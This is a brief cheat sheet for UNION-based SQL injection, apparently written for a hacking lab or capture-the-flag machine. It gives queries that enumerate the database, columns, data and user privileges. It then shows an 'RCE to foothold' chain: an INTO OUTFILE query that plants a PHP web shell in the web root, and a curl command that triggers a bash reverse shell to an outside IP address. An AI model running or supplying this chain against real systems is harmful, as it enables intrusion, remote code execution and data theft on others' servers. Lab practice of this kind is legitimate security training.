# Everything start from 'UNION
### GET table_names Put the database() position as same as the 'a' 
`select database()`
### GET column names
`select column_name from information_schema.columns where table_name = 'registration'`
### GET data from column
`select regtime from registration`
### Check for what privileges the user has
`select privilege_type FROM information_schema.user_privileges where grantee = "'uhc'@'localhost'"`
### A little complicated sample
https://shahjerry33.medium.com/sql-injection-remote-code-execution-double-p1-6038ca88a2ec

### RCE to foothold
```
select "0xdf was here!" into outfile '/var/www/html/0xdf.txt'
select "<?php SYSTEM($_REQUEST['cmd']); ?>" into outfile '/var/www/html/0xdf.php' # Use request not GET
curl 10.129.217.205/0xdf.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.16.9/443 0>&1"'
```
##### Burp
`--data-urlencode` equivalent to Burp `ctrl+u`